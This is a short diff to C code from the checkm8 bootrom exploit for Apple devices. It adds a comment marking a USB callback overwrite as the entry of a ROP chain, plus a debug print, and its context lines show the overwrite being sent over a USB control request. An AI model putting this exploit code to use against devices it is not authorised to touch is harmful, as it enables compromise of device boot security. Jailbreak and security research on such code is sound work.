@@ -1220,8 +1220,10 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			} else {
 				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
 				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base+0x300;
+				//the entry of ROP chain
 				overwrite = &checkm8_overwrite_armv7;
 				overwrite_sz = sizeof(checkm8_overwrite_armv7);
+				printf("data_sz=0x%x", data_sz);
 			}
 			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 				ret = true;
